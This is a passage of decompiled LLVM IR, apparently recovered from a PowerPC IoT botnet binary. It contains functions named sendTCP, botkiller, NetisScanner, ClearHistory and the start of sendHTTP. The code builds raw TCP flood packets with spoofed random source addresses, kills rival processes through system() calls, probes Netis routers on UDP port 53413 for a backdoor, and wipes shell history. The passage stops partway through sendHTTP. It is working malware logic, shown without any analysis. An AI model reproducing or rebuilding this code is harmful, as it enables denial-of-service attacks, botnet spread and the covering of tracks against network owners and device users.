dec_label_pc_10007934:                            ; preds = %dec_label_pc_100078c8, %dec_label_pc_1000759c, %dec_label_pc_1000754c
  %v0_1000795c31 = phi i32 [ %v4_100075b4, %dec_label_pc_1000759c ], [ %v4_10007564, %dec_label_pc_1000754c ], [ %v1_100078cc, %dec_label_pc_100078c8 ]
  br label %dec_label_pc_10007944

dec_label_pc_10007944:                            ; preds = %dec_label_pc_100074b4, %dec_label_pc_10007358, %dec_label_pc_100073e8, %dec_label_pc_100073c8, %dec_label_pc_10007934
  %v0_1000795c = phi i32 [ %v4_10007368, %dec_label_pc_10007358 ], [ 0, %dec_label_pc_100073e8 ], [ %v4_100073e0, %dec_label_pc_100073c8 ], [ %v0_1000795c31, %dec_label_pc_10007934 ], [ %v1_100074b8, %dec_label_pc_100074b4 ]
  ret i32 %v0_1000795c

; uselistorder directives
  uselistorder i32 %v1_10007838.pre-phi, { 1, 0 }
  uselistorder i32 %v1_10007744, { 2, 1, 0 }
  uselistorder i32 %v1_100076f4, { 1, 0 }
  uselistorder i32 %v1_100076cc, { 2, 0, 1 }
  uselistorder i32 %v1_10007684, { 10, 3, 1, 2, 4, 11, 0, 5, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 %v2_10007358, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_10007344, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i32* %stack_var_-108, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 (i32, i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 2, 5, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_10007944, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100077dc.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000784c, { 1, 0 }
  uselistorder label %dec_label_pc_100077dc, { 1, 0 }
  uselistorder label %dec_label_pc_10007758, { 1, 0 }
  uselistorder label %dec_label_pc_10007648, { 1, 0 }
  uselistorder label %dec_label_pc_100075c8, { 1, 0 }
  uselistorder label %dec_label_pc_10007464.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100074b4, { 1, 0 }
  uselistorder label %dec_label_pc_10007464, { 1, 0 }
  uselistorder label %dec_label_pc_10007358, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10007960 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10007960, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_100079b0 = icmp eq i32 %arg2, 0
  br i1 %v3_100079b0, label %dec_label_pc_100079b8, label %dec_label_pc_100079cc

dec_label_pc_100079b8:                            ; preds = %entry
  %v0_100079b8 = call i32 @rand_cmwc()
  br label %dec_label_pc_100079e4

dec_label_pc_100079cc:                            ; preds = %entry
  %v1_100079d0 = urem i32 %arg2, 65536
  store i32 %v1_100079d0, i32* @r3, align 4
  %v1_100079d8 = call i32 @htons(i32 %v1_100079d0)
  br label %dec_label_pc_100079e4

dec_label_pc_100079e4:                            ; preds = %dec_label_pc_100079b8, %dec_label_pc_100079cc
  %v2_100079e4 = ptrtoint i32* %stack_var_-92 to i32
  %v4_100079f4 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_100079e4)
  %v3_100079fc = icmp eq i32 %v4_100079f4, 0
  br i1 %v3_100079fc, label %dec_label_pc_10007a08, label %dec_label_pc_10007f8c

dec_label_pc_10007a08:                            ; preds = %dec_label_pc_100079e4
  store i32 268466736, i32* @lr, align 4
  %v3_10007a2c = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_10007a3c = icmp eq i32 %v3_10007a2c, 0
  br i1 %v3_10007a3c, label %dec_label_pc_10007a44, label %dec_label_pc_10007a64

dec_label_pc_10007a44:                            ; preds = %dec_label_pc_10007a08
  %v3_10007a48 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_10007a60.283 to i32), i32* @lr, align 4
  %v4_10007a5c = call i32 @sockprintf(i32 %v3_10007a48, i32 ptrtoint ([27 x i8]* @global_var_100145ec.274 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  br label %dec_label_pc_10007f8c

dec_label_pc_10007a64:                            ; preds = %dec_label_pc_10007a08
  store i32 1, i32* %stack_var_-76, align 4
  %v2_10007a6c = ptrtoint i32* %stack_var_-76 to i32
  store i32 268466824, i32* @lr, align 4
  %v5_10007a84 = call i32 @__GI_setsockopt(i32 %v3_10007a2c, i32 0, i32 3, i32 %v2_10007a6c, i32 4)
  %tmp59 = icmp sgt i32 %v5_10007a84, -1
  br i1 %tmp59, label %dec_label_pc_10007ab4, label %dec_label_pc_10007a94

dec_label_pc_10007a94:                            ; preds = %dec_label_pc_10007a64
  %v3_10007a98 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_10007ab0.284 to i32), i32* @lr, align 4
  %v4_10007aac = call i32 @sockprintf(i32 %v3_10007a98, i32 ptrtoint ([33 x i8]* @global_var_10014608.279 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  br label %dec_label_pc_10007f8c

dec_label_pc_10007ab4:                            ; preds = %dec_label_pc_10007a64
  %v3_10007ab8 = icmp eq i32 %arg4, 0
  br i1 %v3_10007ab8, label %dec_label_pc_10007ae4, label %dec_label_pc_10007acc

dec_label_pc_10007acc:                            ; preds = %dec_label_pc_10007ab4
  %v1_10007ad0 = sub i32 32, %arg4
  %v2_10007ad8 = urem i32 %v1_10007ad0, 64
  %v1_10007adc = shl i32 -1, %v2_10007ad8
  br label %dec_label_pc_10007ae4

dec_label_pc_10007ae4:                            ; preds = %dec_label_pc_10007ab4, %dec_label_pc_10007acc
  %storemerge9 = phi i32 [ %v1_10007adc, %dec_label_pc_10007acc ], [ 0, %dec_label_pc_10007ab4 ]
  %v1_10007ae8 = add i32 %arg6, 40
  %v1_10007af8 = add i32 %arg6, 70
  %v1_10007afc = and i32 %v1_10007af8, -16
  %v2_10007b04 = load i32, i32* %stack_var_-128, align 4
  %v1_10007b0c = load i32, i32* @r1, align 4
  %v3_10007b0c = sub i32 %v1_10007b0c, %v1_10007afc
  %v4_10007b0c = inttoptr i32 %v3_10007b0c to i32*
  store i32 %v2_10007b04, i32* %v4_10007b0c, align 4
  %v1_10007b1c = add i32 %v3_10007b0c, 23
  %v1_10007b20 = and i32 %v1_10007b1c, -16
  %v1_10007b40 = add i32 %v1_10007b20, 20
  %v5_10007b44 = inttoptr i32 %v1_10007b40 to i16*
  %v3_10007b48 = load i32, i32* %stack_var_-88, align 4
  %v1_10007b50 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_10007b50, i32* @r3, align 4
  %v1_10007b5c = call i32 @htonl(i32 %v1_10007b50)
  %v1_10007b68 = add i32 %arg6, 20
  %v6_10007b80 = inttoptr i32 %v1_10007b20 to i32*
  %v7_10007b80 = call i32 @makeIPPacket(i32* %v6_10007b80, i32 %v3_10007b48, i32 %v1_10007b5c, i32 6, i32 %v1_10007b68, i32 %arg6)
  %v0_10007b84 = call i32 @rand_cmwc()
  %v1_10007b94 = trunc i32 %v0_10007b84 to i16
  store i16 %v1_10007b94, i16* %v5_10007b44, align 4
  %v0_10007b98 = call i32 @rand_cmwc()
  %v2_10007ba4 = add i32 %v1_10007b20, 24
  %v3_10007ba4 = inttoptr i32 %v2_10007ba4 to i32*
  store i32 %v0_10007b98, i32* %v3_10007ba4, align 8
  %v2_10007bb0 = add i32 %v1_10007b20, 28
  %v3_10007bb0 = inttoptr i32 %v2_10007bb0 to i32*
  store i32 0, i32* %v3_10007bb0, align 4
  %v1_10007bb8 = add i32 %v1_10007b20, 32
  %v2_10007bb8 = inttoptr i32 %v1_10007bb8 to i32*
  %v1_10007bc0 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_10007bc4 = add i32 %v1_10007b20, 32
  %v3_10007bc4 = inttoptr i32 %v2_10007bc4 to i32*
  store i32 %v1_10007bc0, i32* %v3_10007bc4, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_1001462c.285 to i32), i32* @r4, align 4
  %v3_10007bd8 = inttoptr i32 %arg5 to i8*
  %v4_10007bd8 = call i32 @__GI_strcoll(i8* %v3_10007bd8, i32 ptrtoint ([4 x i8]* @global_var_1001462c.285 to i32))
  %v3_10007be0 = icmp eq i32 %v4_10007bd8, 0
  br i1 %v3_10007be0, label %dec_label_pc_10007be8, label %dec_label_pc_10007c3c

dec_label_pc_10007be8:                            ; preds = %dec_label_pc_10007ae4
  %v3_10007bec = load i32, i32* %v2_10007bb8, align 16
  %v1_10007c30 = or i32 %v3_10007bec, 2031616
  store i32 %v1_10007c30, i32* %v2_10007bb8, align 16
  br label %dec_label_pc_10007da4

dec_label_pc_10007c3c:                            ; preds = %dec_label_pc_10007ae4
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268467280, i32* @lr, align 4
  %v3_10007c4c = call i32 @__GI_strtok(i32 %arg5, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_10007d9c18 = icmp eq i32 %v3_10007c4c, 0
  br i1 %v3_10007d9c18, label %dec_label_pc_10007da4, label %dec_label_pc_10007c5c

dec_label_pc_10007c5c:                            ; preds = %dec_label_pc_10007c3c, %dec_label_pc_10007d80
  %storemerge1319 = phi i32 [ %v3_10007d8c, %dec_label_pc_10007d80 ], [ %v3_10007c4c, %dec_label_pc_10007c3c ]
  store i32 ptrtoint ([4 x i8]* @global_var_10014634.287 to i32), i32* @r4, align 4
  %v3_10007c6c = inttoptr i32 %storemerge1319 to i8*
  %v4_10007c6c = call i32 @__GI_strcoll(i8* %v3_10007c6c, i32 ptrtoint ([4 x i8]* @global_var_10014634.287 to i32))
  %v3_10007c74 = icmp eq i32 %v4_10007c6c, 0
  br i1 %v3_10007c74, label %dec_label_pc_10007c7c, label %dec_label_pc_10007c90

dec_label_pc_10007c7c:                            ; preds = %dec_label_pc_10007c5c
  %v3_10007c80 = load i32, i32* %v2_10007bb8, align 16
  %v1_10007c84 = or i32 %v3_10007c80, 131072
  store i32 %v1_10007c84, i32* %v2_10007bb8, align 16
  br label %dec_label_pc_10007d80

dec_label_pc_10007c90:                            ; preds = %dec_label_pc_10007c5c
  store i32 ptrtoint ([4 x i8]* @global_var_10014638.288 to i32), i32* @r4, align 4
  %v4_10007ca0 = call i32 @__GI_strcoll(i8* %v3_10007c6c, i32 ptrtoint ([4 x i8]* @global_var_10014638.288 to i32))
  %v3_10007ca8 = icmp eq i32 %v4_10007ca0, 0
  br i1 %v3_10007ca8, label %dec_label_pc_10007cb0, label %dec_label_pc_10007cc4

dec_label_pc_10007cb0:                            ; preds = %dec_label_pc_10007c90
  %v3_10007cb4 = load i32, i32* %v2_10007bb8, align 16
  %v1_10007cb8 = or i32 %v3_10007cb4, 262144
  store i32 %v1_10007cb8, i32* %v2_10007bb8, align 16
  br label %dec_label_pc_10007d80

dec_label_pc_10007cc4:                            ; preds = %dec_label_pc_10007c90
  store i32 ptrtoint ([4 x i8]* @global_var_1001463c.289 to i32), i32* @r4, align 4
  %v4_10007cd4 = call i32 @__GI_strcoll(i8* %v3_10007c6c, i32 ptrtoint ([4 x i8]* @global_var_1001463c.289 to i32))
  %v3_10007cdc = icmp eq i32 %v4_10007cd4, 0
  br i1 %v3_10007cdc, label %dec_label_pc_10007ce4, label %dec_label_pc_10007cf8

dec_label_pc_10007ce4:                            ; preds = %dec_label_pc_10007cc4
  %v3_10007ce8 = load i32, i32* %v2_10007bb8, align 16
  %v1_10007cec = or i32 %v3_10007ce8, 65536
  store i32 %v1_10007cec, i32* %v2_10007bb8, align 16
  br label %dec_label_pc_10007d80

dec_label_pc_10007cf8:                            ; preds = %dec_label_pc_10007cc4
  store i32 ptrtoint ([4 x i8]* @global_var_10014640.290 to i32), i32* @r4, align 4
  %v4_10007d08 = call i32 @__GI_strcoll(i8* %v3_10007c6c, i32 ptrtoint ([4 x i8]* @global_var_10014640.290 to i32))
  %v3_10007d10 = icmp eq i32 %v4_10007d08, 0
  br i1 %v3_10007d10, label %dec_label_pc_10007d18, label %dec_label_pc_10007d2c

dec_label_pc_10007d18:                            ; preds = %dec_label_pc_10007cf8
  %v3_10007d1c = load i32, i32* %v2_10007bb8, align 16
  %v1_10007d20 = or i32 %v3_10007d1c, 1048576
  store i32 %v1_10007d20, i32* %v2_10007bb8, align 16
  br label %dec_label_pc_10007d80

dec_label_pc_10007d2c:                            ; preds = %dec_label_pc_10007cf8
  store i32 ptrtoint ([4 x i8]* @global_var_10014644.291 to i32), i32* @r4, align 4
  %v4_10007d3c = call i32 @__GI_strcoll(i8* %v3_10007c6c, i32 ptrtoint ([4 x i8]* @global_var_10014644.291 to i32))
  %v3_10007d44 = icmp eq i32 %v4_10007d3c, 0
  br i1 %v3_10007d44, label %dec_label_pc_10007d4c, label %dec_label_pc_10007d60

dec_label_pc_10007d4c:                            ; preds = %dec_label_pc_10007d2c
  %v3_10007d50 = load i32, i32* %v2_10007bb8, align 16
  %v1_10007d54 = or i32 %v3_10007d50, 524288
  store i32 %v1_10007d54, i32* %v2_10007bb8, align 16
  br label %dec_label_pc_10007d80

dec_label_pc_10007d60:                            ; preds = %dec_label_pc_10007d2c
  %v3_10007d64 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007d80.293 to i32), i32* @lr, align 4
  %v5_10007d7c = call i32 @sockprintf(i32 %v3_10007d64, i32 ptrtoint ([18 x i8]* @global_var_10014648.292 to i32), i32 %storemerge1319)
  br label %dec_label_pc_10007d80

dec_label_pc_10007d80:                            ; preds = %dec_label_pc_10007d4c, %dec_label_pc_10007d18, %dec_label_pc_10007ce4, %dec_label_pc_10007cb0, %dec_label_pc_10007c7c, %dec_label_pc_10007d60
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268467600, i32* @lr, align 4
  %v3_10007d8c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_10007d9c = icmp eq i32 %v3_10007d8c, 0
  br i1 %v3_10007d9c, label %dec_label_pc_10007da4, label %dec_label_pc_10007c5c

dec_label_pc_10007da4:                            ; preds = %dec_label_pc_10007d80, %dec_label_pc_10007c3c, %dec_label_pc_10007be8
  %v0_10007da4 = call i32 @rand_cmwc()
  %v1_10007db4 = trunc i32 %v0_10007da4 to i16
  %v3_10007db4 = add i32 %v1_10007b20, 34
  %v4_10007db4 = inttoptr i32 %v3_10007db4 to i16*
  store i16 %v1_10007db4, i16* %v4_10007db4, align 2
  %v3_10007dc0 = add i32 %v1_10007b20, 36
  %v4_10007dc0 = inttoptr i32 %v3_10007dc0 to i16*
  store i16 0, i16* %v4_10007dc0, align 4
  %v3_10007dcc = add i32 %v1_10007b20, 38
  %v4_10007dcc = inttoptr i32 %v3_10007dcc to i16*
  store i16 0, i16* %v4_10007dcc, align 2
  br i1 %v3_100079b0, label %dec_label_pc_10007ddc, label %dec_label_pc_10007df0

dec_label_pc_10007ddc:                            ; preds = %dec_label_pc_10007da4
  %v0_10007ddc = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_10007ddc to i16
  br label %dec_label_pc_10007e08

dec_label_pc_10007df0:                            ; preds = %dec_label_pc_10007da4
  %v1_10007df4 = urem i32 %arg2, 65536
  store i32 %v1_10007df4, i32* @r3, align 4
  %v1_10007dfc = call i32 @htons(i32 %v1_10007df4)
  %extract.t = trunc i32 %v1_10007dfc to i16
  br label %dec_label_pc_10007e08

dec_label_pc_10007e08:                            ; preds = %dec_label_pc_10007ddc, %dec_label_pc_10007df0
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_10007df0 ], [ %extract.t63, %dec_label_pc_10007ddc ]
  %v3_10007e10 = add i32 %v1_10007b20, 22
  %v4_10007e10 = inttoptr i32 %v3_10007e10 to i16*
  store i16 %storemerge60.off0, i16* %v4_10007e10, align 2
  store i32 268467744, i32* @lr, align 4
  %v3_10007e1c = inttoptr i32 %v1_10007b40 to i32*
  %v4_10007e1c = call i32 @tcpcsum(i32 %v1_10007b20, i32* %v3_10007e1c, i32 %v1_10007b40)
  %v1_10007e28 = trunc i32 %v4_10007e1c to i16
  store i16 %v1_10007e28, i16* %v4_10007dc0, align 4
  %v1_10007e38 = or i32 %v1_10007b20, 2
  %v2_10007e38 = inttoptr i32 %v1_10007e38 to i16*
  %v3_10007e38 = load i16, i16* %v2_10007e38, align 2
  %v4_10007e38 = zext i16 %v3_10007e38 to i32
  %v5_10007e48 = inttoptr i32 %v1_10007b20 to i16*
  %v6_10007e48 = call i32 @csum(i16* %v5_10007e48, i32 %v4_10007e38, i32 %v1_10007b20, i32 6, i32 %v1_10007b68)
  %sext3 = mul i32 %v6_10007e48, 65536
  %v1_10007e4c = sdiv i32 %sext3, 65536
  %v1_10007e54 = trunc i32 %v1_10007e4c to i16
  %v3_10007e54 = or i32 %v1_10007b20, 10
  %v4_10007e54 = inttoptr i32 %v3_10007e54 to i16*
  store i16 %v1_10007e54, i16* %v4_10007e54, align 2
  store i32 268467808, i32* @lr, align 4
  %v1_10007e5c = call i32 @__GI_time(i32 0)
  %v2_10007e68 = add i32 %v1_10007e5c, %arg3
  %v2_10007ebc = or i32 %v1_10007b20, 12
  %v3_10007ebc = inttoptr i32 %v2_10007ebc to i32*
  %v3_10007ed0 = or i32 %v1_10007b20, 4
  %v4_10007ed0 = inttoptr i32 %v3_10007ed0 to i16*
  br label %dec_label_pc_10007e7c

dec_label_pc_10007e7c:                            ; preds = %dec_label_pc_10007e7c.backedge, %dec_label_pc_10007e08
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10007e08 ], [ %storemerge22, %dec_label_pc_10007e7c.backedge ]
  store i32 268467872, i32* @lr, align 4
  %v7_10007e9c = call i32 @__libc_sendto(i32 %v3_10007a2c, i32 %v1_10007b20, i32 %v1_10007ae8, i32 0, i32 %v2_100079e4, i32 16, i32 %v2_100079e4)
  %v1_10007ea4 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_10007ea4, i32* @r3, align 4
  %v1_10007eb0 = call i32 @htonl(i32 %v1_10007ea4)
  store i32 %v1_10007eb0, i32* %v3_10007ebc, align 4
  %v0_10007ec0 = call i32 @rand_cmwc()
  %v1_10007ed0 = trunc i32 %v0_10007ec0 to i16
  store i16 %v1_10007ed0, i16* %v4_10007ed0, align 4
  %v0_10007ed4 = call i32 @rand_cmwc()
  store i32 %v0_10007ed4, i32* %v3_10007ba4, align 8
  %v0_10007ee4 = call i32 @rand_cmwc()
  %v1_10007ef4 = trunc i32 %v0_10007ee4 to i16
  store i16 %v1_10007ef4, i16* %v5_10007b44, align 4
  store i16 0, i16* %v4_10007dc0, align 4
  store i32 268467984, i32* @lr, align 4
  %v4_10007f0c = call i32 @tcpcsum(i32 %v1_10007b20, i32* %v3_10007e1c, i32 %v1_10007b40)
  %v1_10007f18 = trunc i32 %v4_10007f0c to i16
  store i16 %v1_10007f18, i16* %v4_10007dc0, align 4
  %v3_10007f28 = load i16, i16* %v2_10007e38, align 2
  %v4_10007f28 = zext i16 %v3_10007f28 to i32
  %v6_10007f38 = call i32 @csum(i16* %v5_10007e48, i32 %v4_10007f28, i32 %v1_10007b20, i32 0, i32 %v2_100079e4)
  %v1_10007f44 = trunc i32 %v6_10007f38 to i16
  store i16 %v1_10007f44, i16* %v4_10007e54, align 2
  %v4_10007f50 = icmp eq i32 %stack_var_-44.0, %arg7
  br i1 %v4_10007f50, label %dec_label_pc_10007f58, label %dec_label_pc_10007f7c

dec_label_pc_10007f58:                            ; preds = %dec_label_pc_10007e7c
  store i32 268468064, i32* @lr, align 4
  %v1_10007f5c = call i32 @__GI_time(i32 0)
  %v3_10007f68 = icmp sgt i32 %v1_10007f5c, %v2_10007e68
  br i1 %v3_10007f68, label %dec_label_pc_10007f8c, label %dec_label_pc_10007e7c.backedge

dec_label_pc_10007e7c.backedge:                   ; preds = %dec_label_pc_10007f58, %dec_label_pc_10007f7c
  %storemerge22 = phi i32 [ %v1_10007f80, %dec_label_pc_10007f7c ], [ 0, %dec_label_pc_10007f58 ]
  br label %dec_label_pc_10007e7c

dec_label_pc_10007f7c:                            ; preds = %dec_label_pc_10007e7c
  %v1_10007f80 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_10007e7c.backedge

dec_label_pc_10007f8c:                            ; preds = %dec_label_pc_10007f58, %dec_label_pc_100079e4, %dec_label_pc_10007a94, %dec_label_pc_10007a44
  %v0_10007fb4 = phi i32 [ %v4_100079f4, %dec_label_pc_100079e4 ], [ %v4_10007aac, %dec_label_pc_10007a94 ], [ %v4_10007a5c, %dec_label_pc_10007a44 ], [ %v1_10007f5c, %dec_label_pc_10007f58 ]
  ret i32 %v0_10007fb4

; uselistorder directives
  uselistorder i32 %v1_10007df4, { 1, 0 }
  uselistorder i32 %v3_10007d8c, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i32* %v2_10007bb8, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_10007b68, { 1, 0 }
  uselistorder i32 %v1_10007b40, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10007b20, { 14, 15, 4, 2, 3, 5, 16, 1, 6, 17, 7, 8, 9, 10, 0, 11, 12, 13, 18, 19 }
  uselistorder i32 %v2_100079e4, { 1, 3, 2, 0 }
  uselistorder i32 %v1_100079d0, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 -16, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10007f8c, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10007e7c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10007e08, { 1, 0 }
  uselistorder label %dec_label_pc_10007d80, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10007c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10007ae4, { 1, 0 }
  uselistorder label %dec_label_pc_100079e4, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10007fb8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10007fb8, i32* %stack_var_-112, align 4
  %v5_10007fb8 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v5_10007fb8, i32* @r31, align 4
  %v2_10007fd8 = ptrtoint i8** %stack_var_-100 to i32
  %v2_10008020 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_10007fcc

dec_label_pc_10007fcc:                            ; preds = %dec_label_pc_100080bc, %entry
  br label %dec_label_pc_10007fd8

dec_label_pc_10007fd8:                            ; preds = %dec_label_pc_10007fcc, %dec_label_pc_10007fd8
  %storemerge34 = phi i32 [ 0, %dec_label_pc_10007fcc ], [ %v1_100080a8, %dec_label_pc_10007fd8 ]
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v1_10008008 = mul i32 %storemerge34, 4
  %v2_1000800c = add i32 %v1_10008008, ptrtoint ([86 x i8*]* @global_var_1002e024.379 to i32)
  %v1_10008010 = inttoptr i32 %v2_1000800c to i32*
  %v2_10008010 = load i32, i32* %v1_10008010, align 4
  store i32 %v2_10008010, i32* @r4, align 4
  %v3_10008020 = call i32 @strcat(i8* %v2_10008020, i32 %v2_10008010)
  store i32 268468272, i32* @lr, align 4
  %v1_1000802c = call i32 @__libc_system(i32 %v2_10007fd8)
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v2_10008070 = load i32, i32* %v1_10008010, align 4
  store i32 %v2_10008070, i32* @r4, align 4
  %v3_10008080 = call i32 @strcat(i8* %v2_10008020, i32 %v2_10008070)
  store i32 ptrtoint (i32* @global_var_10014674.384 to i32), i32* @r4, align 4
  %v3_10008094 = call i32 @strcat(i8* %v2_10008020, i32 ptrtoint (i32* @global_var_10014674.384 to i32))
  store i32 268468388, i32* @lr, align 4
  %v1_100080a0 = call i32 @__libc_system(i32 %v2_10007fd8)
  %v1_100080a8 = add nuw nsw i32 %storemerge34, 1
  %tmp13 = icmp slt i32 %v1_100080a8, 9
  br i1 %tmp13, label %dec_label_pc_10007fd8, label %dec_label_pc_100080bc

dec_label_pc_100080bc:                            ; preds = %dec_label_pc_10007fd8
  store i32 268468420, i32* @lr, align 4
  %v1_100080c0 = call i32 @sleep(i32 5)
  br label %dec_label_pc_10007fcc

; uselistorder directives
  uselistorder i32 %storemerge34, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder [3 x i8]* @global_var_10013490.21, { 1, 0 }
  uselistorder label %dec_label_pc_10007fd8, { 1, 0 }
}

define i32 @NetisScanner(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_10008160 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_100080dc

dec_label_pc_100080dc:                            ; preds = %dec_label_pc_100080dc, %entry
  store i32 268468460, i32* @lr, align 4
  %v3_100080e8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 2, i32* %stack_var_-24, align 4
  store i32 53413, i32* @r3, align 4
  %v1_10008104 = call i32 @htons(i32 53413)
  store i32 268468500, i32* @lr, align 4
  %v0_10008110 = call i32 @NetisRanges()
  store i32 ptrtoint ([16 x i8]* @global_var_10014678.385 to i32), i32* @r3, align 4
  %v0_10008158 = call i32 @__GI_strlen()
  store i32 268468608, i32* @lr, align 4
  %v8_1000817c = call i32 @__libc_sendto(i32 %v3_100080e8, i32 ptrtoint ([16 x i8]* @global_var_10014678.385 to i32), i32 %v0_10008158, i32 0, i32 %v2_10008160, i32 16, i32 %v2_10008160)
  store i32 ptrtoint ([3 x i8]* @global_var_1001468c.386 to i32), i32* @r3, align 4
  %v0_10008184 = call i32 @__GI_strlen()
  store i32 268468652, i32* @lr, align 4
  %v8_100081a8 = call i32 @__libc_sendto(i32 %v3_100080e8, i32 ptrtoint ([3 x i8]* @global_var_1001468c.386 to i32), i32 %v0_10008184, i32 0, i32 %v2_10008160, i32 16, i32 %v2_10008160)
  store i32 268468660, i32* @lr, align 4
  %v1_100081b0 = call i32 @__libc_close(i32 %v3_100080e8)
  br label %dec_label_pc_100080dc

; uselistorder directives
  uselistorder i32 %v2_10008160, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 4, 3, 2, 1, 0 }
}

define i32 @ClearHistory(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100081b8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100081b8, i32* %stack_var_-16, align 4
  %v5_100081b8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v5_100081b8, i32* @r31, align 4
  store i32 268468696, i32* @lr, align 4
  %v2_100081d4 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1001472c.387 to i32))
  store i32 268468708, i32* @lr, align 4
  %v2_100081e0 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_10014744.388 to i32))
  store i32 268468720, i32* @lr, align 4
  %v2_100081ec = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_10014764.389 to i32))
  ret i32 %v2_100081ec

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-572 = alloca i32, align 4
  %stack_var_-3192 = alloca i32, align 4
  %stack_var_-3180 = alloca i32, align 4
  %v2_10008244 = ptrtoint i32* %stack_var_-3180 to i32
  store i32 %v2_10008244, i32* @r3, align 4
  store i32 ptrtoint ([649 x i8*]* @global_var_1001b164.692 to i32), i32* @r4, align 4
  store i32 2596, i32* @r5, align 4
  store i32 268468828, i32* @lr, align 4
  %v0_10008258 = call i32 @memcpy()
  store i32 268468868, i32* @lr, align 4
  %v1_10008280 = call i32 @__GI_time(i32 0)
  %v2_1000828c = add i32 %v1_10008280, %arg5
  store i32 268468888, i32* @lr, align 4
  %v0_10008294 = call i32 @random()
